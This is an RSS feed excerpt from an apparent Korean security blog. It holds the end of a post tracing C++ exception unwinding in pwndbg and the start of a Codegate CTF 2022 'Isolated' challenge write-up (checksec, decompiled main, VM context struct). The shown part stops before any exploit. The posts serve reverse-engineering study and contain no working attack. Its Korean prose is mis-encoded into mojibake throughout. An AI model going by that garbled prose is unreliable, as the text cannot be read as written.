0x1</span><br><span class="line">        rsi: 0x1</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 â—‚â€” 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6</span><br><span class="line">   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;</span><br><span class="line">pwndbg&gt; set $context=$r8</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br></pre></td></tr></table></figure><p>Personality ë£¨í‹´ì˜ ë°˜í™˜ê°’ì€ <code>_URC_CONTINUE_UNWIND</code> ì— í•´ë‹¹í•˜ëŠ” 8ì…ë‹ˆë‹¤. ìŠ¤íƒ ë˜ê°ê¸°ë¥¼ ë°˜ë³µí•˜ì—¬ <code>func</code> í•¨ìˆ˜ì˜ í”„ë ˆì„ìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x8                 8</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5</span><br><span class="line">   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0e88</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e90  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e98  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0ea0  0x000000000040130c</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x40130c &lt;main+30&gt;:  mov    eax,0x0</span><br><span class="line">   0x401311 &lt;main+35&gt;:  jmp    0x40135b &lt;main+109&gt;</span><br><span class="line">   0x401313 &lt;main+37&gt;:  endbr64</span><br><span class="line">   0x401317 &lt;main+41&gt;:  cmp    rdx,0x1</span><br></pre></td></tr></table></figure><p><code>func</code> í•¨ìˆ˜ì—ì„œ ìŠ¤íƒì„ ë˜ê°ìœ¼ë©´ <code>main</code> í•¨ìˆ˜ì˜ catch ë¸”ë¡ìœ¼ë¡œ ì´ë™í•´ì•¼ í•©ë‹ˆë‹¤. ê³„ì† ì‹¤í–‰í•˜ë©´ personality ë£¨í‹´ì´ í˜¸ì¶œë˜ë©°, <code>_URC_HANDLER_FOUND</code> ì— í•´ë‹¹í•˜ëŠ” 6ì„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 0x1</span><br><span class="line">        rsi: 0x1</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 â—‚â€” 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6</span><br><span class="line">   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x6                 6</span><br></pre></td></tr></table></figure><p>search ë‹¨ê³„ì˜ ì„±ê³µìœ¼ë¡œ ë°˜ë³µë¬¸ì„ íƒˆì¶œí•©ë‹ˆë‹¤. ê³„ì† ì‹¤í–‰í•˜ë©´ <code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” 4ë²ˆì§¸ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶”ê²Œ ë©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 5, 0x00007f845bf3b27c in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> â–º 0x7f845bf3b27c &lt;_Unwind_RaiseException+812&gt;    call   0x7f845bf3ab50                &lt;0x7f845bf3ab50&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b281 &lt;_Unwind_RaiseException+817&gt;    cmp    eax, 7</span><br><span class="line">   0x7f845bf3b284 &lt;_Unwind_RaiseException+820&gt;    jne    _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br></pre></td></tr></table></figure><p><code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ ë‚´ì—ì„œ personality ë£¨í‹´ì„ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì— ì¶”ê°€ë¡œ ì¤‘ë‹¨ì ì„ ë‘ê² ìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/43i 0x7f845bf3ab50</span><br><span class="line">   0x7f845bf3ab50:  push   r15</span><br><span class="line">   0x7f845bf3ab52:  push   r14</span><br><span class="line">   # ...</span><br><span class="line">   0x7f845bf3abe5:  or     esi,0x2</span><br><span class="line">   0x7f845bf3abe8:  mov    edi,0x1</span><br><span class="line">   0x7f845bf3abed:  call   rax                    # call personality routine </span><br><span class="line">   0x7f845bf3abef:  cmp    eax,0x7</span><br><span class="line">   0x7f845bf3abf2:  je     0x7f845bf3ac90</span><br><span class="line">pwndbg&gt; break *0x7f845bf3abed</span><br><span class="line">Breakpoint 7 at 0x7f845bf3abed</span><br></pre></td></tr></table></figure><p>ê³„ì† ì‹¤í–‰í•˜ë©´ cleanup ë‹¨ê³„ë¥¼ ìˆ˜í–‰í•˜ëŠ” <code>_Unwind_RaiseException_Phase2</code> í•¨ìˆ˜ ë‚´ë¶€ë¡œ ì§„ì…í•©ë‹ˆë‹¤. ìƒˆë¡œ ì„¤ì •í•œ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶”ë©°, personality ë£¨í‹´ì„ í˜¸ì¶œí•˜ê¸° ì „ <code>context-&gt;ra</code> í•„ë“œì˜ ê°’ì€ <code>0x4012a6</code> ìœ¼ë¡œ <code>func</code> í•¨ìˆ˜ì—ì„œ <code>func2</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì§í›„ì˜ ì£¼ì†Œì…ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 7, 0x00007f845bf3abed in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line">   0x7f845bf3abe8    mov    edi, 1</span><br><span class="line"> â–º 0x7f845bf3abed    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 0x1</span><br><span class="line">        rsi: 0x2</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 â—‚â€” 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3abef    cmp    eax, 7</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($context+8*19)</span><br><span class="line">   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax</span><br><span class="line">   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012b2 &lt;func()+74&gt;:    nop</span><br></pre></td></tr></table></figure><p>Personality ë£¨í‹´ì„ í˜¸ì¶œí•˜ë©´ <code>_URC_INSTALL_CONTEXT</code> ì— í•´ë‹¹í•˜ëŠ” 7ì„ ë°˜í™˜í•˜ë©°, <code>context-&gt;ra</code> í•„ë“œì˜ ê°’ì´ <code>0x4012c4</code> ë¡œ ë°”ë€Œì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” <code>func</code> í•¨ìˆ˜ì—ì„œ <code>MyClass</code> ì˜ ì†Œë©¸ìë¥¼ í˜¸ì¶œí•˜ëŠ” ëœë”© íŒ¨ë“œì˜ ì‹œì‘ ì£¼ì†Œì…ë‹ˆë‹¤. ì´ì™€ ê°™ì´ cleanup ë‹¨ê³„ì—ì„œëŠ” LSDAë¥¼ í•´ì„í•˜ì—¬ ëœë”© íŒ¨ë“œì˜ ì£¼ì†Œë¥¼ ì°¾ì•„ <code>context-&gt;ra</code> í•„ë“œì— ëŒ€ì…í•˜ì—¬ ì‹¤í–‰ íë¦„ì´ ëœë”© íŒ¨ë“œë¡œ ì˜®ê²¨ì§ˆ ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x7                 7</span><br><span class="line">pwndbg&gt; x/8i *(uint64_t *)($context+8*19)</span><br><span class="line">   0x4012c4 &lt;func()+92&gt;:    endbr64</span><br><span class="line">   0x4012c8 &lt;func()+96&gt;:    mov    rbx,rax</span><br><span class="line">   0x4012cb &lt;func()+99&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012cf &lt;func()+103&gt;:   mov    rdi,rax</span><br><span class="line">   0x4012d2 &lt;func()+106&gt;:   call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012d7 &lt;func()+111&gt;:   mov    rax,rbx</span><br><span class="line">   0x4012da &lt;func()+114&gt;:   mov    rdi,rax</span><br><span class="line">   0x4012dd &lt;func()+117&gt;:   call   0x401120 &lt;_Unwind_Resume@plt&gt;</span><br></pre></td></tr></table></figure><p>cleanup ë‹¨ê³„ì˜ ì„±ê³µìœ¼ë¡œ ë°˜ë³µë¬¸ì„ íƒˆì¶œí•©ë‹ˆë‹¤. ê³„ì† ì‹¤í–‰í•˜ë©´ <code>uw_install_context</code> ë§¤í¬ë¡œì˜ ë‚´ë¶€ì¸ ë§ˆì§€ë§‰ ì¤‘ë‹¨ì ì—ì„œ ë©ˆì¶”ê²Œ ë©ë‹ˆë‹¤. ì´ ë§¤í¬ë¡œëŠ” <code>context</code> êµ¬ì¡°ì²´ì˜ ë‚´ìš©ì„ ì‹¤ì œ ë ˆì§€ìŠ¤í„°ì— ë°˜ì˜í•˜ëŠ” ì½”ë“œë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë§¤í¬ë¡œì˜ ëì—ì„œ ì í”„ë¥¼ ìˆ˜í–‰í•˜ë©´ ëœë”© íŒ¨ë“œë¡œ ì‹¤í–‰ íë¦„ì„ ì˜®ê¸°ë©´ì„œ <code>MyClass</code> ì˜ ì†Œë©¸ì°¨ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; emu 3</span><br><span class="line"> â–º 0x7f845bf3b2d9 &lt;_Unwind_RaiseException+905&gt;    jmp    rcx                           &lt;func()+92&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x4012c4       &lt;func()+92&gt;                     endbr64</span><br><span class="line">   0x4012c8       &lt;func()+96&gt;                     mov    rbx, rax</span><br><span class="line">   0x4012cb       &lt;func()+99&gt;                     lea    rax, [rbp - 0x19]</span><br><span class="line">   0x4012cf       &lt;func()+103&gt;                    mov    rdi, rax</span><br><span class="line">   0x4012d2       &lt;func()+106&gt;                    call   MyClass::~MyClass()                      &lt;MyClass::~MyClass()&gt;</span><br><span class="line"></span><br><span class="line">   0x4012d7       &lt;func()+111&gt;                    mov    rax, rbx</span><br></pre></td></tr></table></figure><h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">ì°¸ê³ ìë£Œ</h2><p>[1] S. B. Lippman, J. Lajoie and B. E. Moo, â€œ18.1 Exception Handling,â€ in <em>C++ Primer</em>, 5th ed. Boston, MA: Addison-Wesley, 2012, pp. 772-784.<br>[2] <em>DWARF Debugging Information Format, Version 5</em>, DWARF Debugging Information Format Committee, 2012.<br>[3] <em>Exception Handling</em>, Itanium C++ ABI, 2012. [Online] Available: <a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html</a><br>[4] <em>Exception Handling Tables</em>, HP aC++ A.01.15 - Public version, 2012. [Online] Available: <a href="https://itanium-cxx-abi.github.io/cxx-abi/exceptions.pdf">https://itanium-cxx-abi.github.io/cxx-abi/exceptions.pdf</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content:encoded>
      
      
      <category domain="https://juhyun167.github.io/categories/Security/">Security</category>
      
      <category domain="https://juhyun167.github.io/categories/Security/Reverse-Engineering/">Reverse Engineering</category>
      
      
      
      <comments>https://juhyun167.github.io/2022/07/17/cpp-exception-handling/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Codegate CTF 2022] Isolated</title>
      <link>https://juhyun167.github.io/2022/07/06/codegate22-isolated/</link>
      <guid>https://juhyun167.github.io/2022/07/06/codegate22-isolated/</guid>
      <pubDate>Wed, 06 Jul 2022 23:25:37 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;%EA%B0%9C%EC%9A%94&quot; tabindex=&quot;-1&quot;&gt;ê°œìš”&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Simple VM, But isloated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;/uploads/codegate22</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><blockquote><p>Simple VM, But isloated.</p></blockquote><p><a href="/uploads/codegate22-isolated/chall.zip">chall.zip</a></p><h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">ë¬¸ì œ ë¶„ì„</h2><p>64ë¹„íŠ¸ x86_64 ë°”ì´ë„ˆë¦¬ <code>isolated</code> ì™€ <code>Dockerfile</code> ë“±ì´ ì£¼ì–´ì§‘ë‹ˆë‹¤. ë°”ì´ë„ˆë¦¬ëŠ” ì‹¬ë³¼ì´ stripë˜ì–´ ìˆê³ , Canary, NX, PIE ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec isolated</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/isolated/isolated&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ë¡œê³ ë¥¼ ì¶œë ¥í•˜ê³  opcodeë¥¼ ì…ë ¥ë°›ìŠµë‹ˆë‹¤. ì•„ë¬´ ë¬¸ìì—´ì´ë‚˜ ì…ë ¥í–ˆë”ë‹ˆ <code>SIGKILL</code> ì‹œê·¸ë„ì„ ë°›ê³  ì¢…ë£Œí•©ë‹ˆë‹¤. ë¡œê³ ì˜ 'VMâ€™ì´ë‚˜, opcodeë¥¼ ì…ë ¥ë°›ëŠ”ë‹¤ëŠ” ì ì—ì„œ ê°€ìƒë¨¸ì‹ ì„ ë¬˜ì‚¬í•œ ë°”ì´ë„ˆë¦¬ì„ì„ ì¶”ì¸¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./isolated</span><br><span class="line">   __   __        __       ___  ___  __</span><br><span class="line">| /__` /  \ |    /  \  /\   |  |__  |  \    __    \  /  |\/|</span><br><span class="line">| .__/ \__/ |___ \__/ /~~\  |  |___ |__/           \/   |  |</span><br><span class="line"></span><br><span class="line">opcodes &gt;aaaa</span><br><span class="line">[1]    1544809 killed     ./isolated</span><br></pre></td></tr></table></figure><p><code>main</code> í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. 12í–‰ì—ì„œ <code>code</code> ë¥¼ 768ë°”ì´íŠ¸ ì…ë ¥ë°›ê³ , 13í–‰ì—ì„œ <code>context</code> êµ¬ì¡°ì²´ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. 14í–‰ì—ì„œ <code>fork</code> ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ì—¬ ìì‹ í”„ë¡œì„¸ìŠ¤ëŠ” <code>run</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³ , ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ëŠ” <code>set_signal_handlers</code> í”„ë¡œì„¸ìŠ¤ë¥¼ í˜¸ì¶œí•˜ë„ë¡ í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ppid; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *code; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> *<span class="title">context</span>;</span> <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  loading();</span><br><span class="line">  code = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x301</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;opcodes &gt;&quot;</span>);</span><br><span class="line">  len = read(<span class="number">0</span>, code, <span class="number">0x300</span>uLL);</span><br><span class="line">  context = (<span class="keyword">struct</span> context *)mmap(<span class="number">0LL</span>, <span class="number">8uLL</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);<span class="comment">// mmap(0, 8, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0)</span></span><br><span class="line">  <span class="keyword">if</span> ( !fork() )                                <span class="comment">// child process</span></span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    alarm(<span class="number">8u</span>);</span><br><span class="line">    ppid = getppid();</span><br><span class="line">    run(ppid, code, len, context);</span><br><span class="line">  &#125;</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  set_signal_handlers(context);                 <span class="comment">// parent process</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>context</code> êµ¬ì¡°ì²´ëŠ” ê°€ìƒë¨¸ì‹ ì˜ ìƒíƒœë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì¡°ì²´ì…ë‹ˆë‹¤. ëª…ë ¹ì–´ì˜ ì‹¤í–‰ ìƒíƒœë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì—´ê±°í˜• ë³€ìˆ˜ <code>state</code> ì™€ ì¸ìë¥¼ ì „ë‹¬ë°›ê³  ê²°ê³¼ë¥¼ ëŒ€ì…í•˜ëŠ” ìš©ë„ë¡œ ì‚¬ìš©í•˜ëŠ” ì •ìˆ˜í˜• ë³€ìˆ˜ <code>reg</code> ë¥¼ ë©¤ë²„ë¡œ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">state</span> <span class="title">state</span>;</span></span><br><span class="line">  u32 reg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ì—´ê±°í˜• <code>state</code> ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ ì¤‘ì„ì„ ë‚˜íƒ€ë‚´ëŠ” <code>LOCKED</code> , ëª…ë ¹ì–´ ì‹¤í–‰ì— ì„±ê³µí–ˆìŒì„ ë‚˜íƒ€ë‚´ëŠ” <code>SUCCESS</code> , ì‹¤í–‰ ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŒì„ ë‚˜íƒ€ë‚´ëŠ” <code>ERROR</code> ë¡œ êµ¬ë¶„ë©ë‹ˆë‹¤. <code>state</code> ì˜ ì‚¬ìš©ì€ ì´í›„ ë¶„ì„í•  í•¨ìˆ˜ë“¤ì—ì„œ ìì„¸íˆ ì‚´í´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">state</span> :</span> <span class="type">unsigned</span> __int32</span><br><span class="line">&#123;</span><br><span class="line">  LOCKED = <span class="number">0x1</span>,</span><br><span class="line">  SUCCESS = <span class="number">0x2</span>,</span><br><span class="line">  ERROR = <span class="number">0x3</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ë¶€ëª¨ í”„ë¡œì„¸ìŠ¤ì—ì„œ í˜¸ì¶œí•˜ëŠ” <code>set_signal_handlers</code> í•¨ìˆ˜ëŠ” ì „ì—­ ë³€ìˆ˜ <code>g_context</code> ì— ì•ì„œ í• ë‹¹í•œ <code>context</code> êµ¬ì¡°ì²´ë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤. ì´í›„ ê°ê°ì˜ ì‹œê·¸ë„ ë²ˆí˜¸ì— í•´ë‹¹í•˜ëŠ” í•¸ë“¤ëŸ¬ í•¨ìˆ˜ë¥¼ ë“±ë¡í•˜ê³  ë¬´í•œ ë£¨í”„ì— 